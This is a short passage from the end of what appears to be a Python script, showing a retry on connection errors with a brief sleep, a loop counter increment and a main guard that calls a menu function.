		except requests.exceptions.ConnectionError:
			time.sleep(0.1)

	loop+=1

	
if __name__=='__main__':
	menu()